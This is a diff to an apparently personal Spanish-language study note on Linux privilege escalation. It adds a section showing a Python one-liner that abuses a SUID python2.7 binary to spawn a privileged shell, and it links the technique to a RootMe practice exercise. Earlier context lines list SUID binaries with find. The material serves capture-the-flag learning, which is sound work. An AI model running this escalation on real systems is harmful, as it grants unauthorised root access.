@@ -68,6 +68,14 @@ find / -perm -4000 2>/dev/null
 
 Cuando ejecutamos ese comando podemos ver los binarios que tengan SUID activados y podremos ejecutar estos binarios con el permiso del propietario, para ello hay que encontrar binarios que no sea habitual encontrarselos, para esapodemos buscar en GTFObins para ver que binarios pueden ser vulnerables
 
+## /usr/bin/python2.7
+
+```bash
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+Caso práctico: [[RootMe]].
+
 ---
 
 # Buscar otros usuarios para ver que procesos hay
